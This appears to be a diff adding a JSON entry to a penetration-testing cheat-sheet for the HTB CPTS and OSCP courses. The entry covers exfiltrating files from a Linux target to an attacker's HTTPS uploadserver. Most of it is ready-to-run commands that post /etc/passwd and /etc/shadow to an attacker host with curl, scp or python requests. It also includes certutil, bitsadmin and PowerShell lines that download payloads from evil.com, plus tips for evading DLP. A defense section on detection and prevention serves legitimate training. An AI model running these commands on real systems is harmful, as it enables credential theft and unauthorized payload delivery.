@@ -1,0 +1,128 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "uploadserver",
+    "curl",
+    "openssl"
+  ],
+  "tags": [
+    "linux",
+    "upload",
+    "https"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Linux Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "CPTS Ch07 — HTTPS uploadserver + curl multi-file upload",
+      "command": "# Attacker:\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n# Target:\ncurl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure"
+    },
+    {
+      "label": "SCP push to attacker SSH server",
+      "command": "scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/"
+    }
+  ],
+  "notes": "Exfil loot OFF a Linux box: base64+paste for small files, or an uploadserver/nc for big ones. Prefer an encrypted channel (scp/openssl) on a real engagement so evidence isn't sniffable. uploadserver adds /upload endpoint to Python's built-in HTTP server. Use HTTPS with self-signed cert to encrypt data in transit. SCP requires SSH running on attacker (sudo systemctl enable ssh && sudo systemctl start ssh). Also covered in: CPTS Ch07 (File Transfers).",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nix-scp",
+      "rel": "alternative",
+      "note": "SCP is the clean encrypted option."
+    },
+    {
+      "id": "nix-download",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "nix-upload",
+  "name": "Linux - Upload to Attacker (HTTPS)",
+  "command": "curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' --insecure",
+  "description": "Exfil over an encrypted uploadserver so files (and creds) aren't sent in cleartext. Generate a self-signed cert, run the HTTPS uploadserver, and POST with curl.",
+  "steps": [
+    {
+      "label": "1. Cert + HTTPS uploadserver (attacker)",
+      "command": "sudo python3 -m pip install --user uploadserver\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nmkdir https && cd https\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem"
+    },
+    {
+      "label": "2. Upload (target)",
+      "command": "curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1048.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Uploading data off a Linux target (curl -F, an attacker web/nc listener, scp) exfiltrates loot over a non-C2 channel.",
+    "prerequisites": "Code execution on the target, data to exfil, and an attacker endpoint reachable over an allowed protocol.",
+    "impact": "Sensitive files leave the environment - a confidentiality breach and material for offline analysis.",
+    "detection": "Outbound data flows to an external/unknown host, unusual for the source process; DLP/egress monitoring on sensitive content; command line (curl -F / nc) in auditd.",
+    "artifacts": "An outbound POST/nc/scp to the attacker; the source process's unusual network connection; DLP hits.",
+    "prevention": "[MITRE T1048 M1037] Egress filtering + DLP; restrict which hosts reach the internet; monitor for large/unusual outbound flows.",
+    "evasion": "Encrypt/compress and chunk data to defeat DLP; exfil over HTTPS/SSH to blend with normal egress.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1048.003"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  },
+  "variations": [
+    {
+      "description": "Start uploadserver HTTP (attacker/Linux)",
+      "command": "pip3 install uploadserver\npython3 -m uploadserver",
+      "label": "pip3"
+    },
+    {
+      "description": "Start uploadserver HTTPS with self-signed cert (attacker)",
+      "command": "openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nmkdir https && cd https\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem",
+      "label": "openssl"
+    },
+    {
+      "description": "Upload file to uploadserver via curl (HTTP)",
+      "command": "curl -X POST http://<ip>:8000/upload -F 'files=@/etc/passwd'",
+      "label": "POST request"
+    },
+    {
+      "description": "Upload multiple files to uploadserver via curl (HTTPS)",
+      "command": "curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure",
+      "label": "POST request"
+    },
+    {
+      "description": "SCP upload (push file to remote)",
+      "command": "scp /etc/passwd <user>@<ip>:/home/<user>/",
+      "label": "scp upload"
+    },
+    {
+      "description": "Alternative web upload — python3 requests one-liner",
+      "command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
+      "label": "python3"
+    }
+  ]
+}
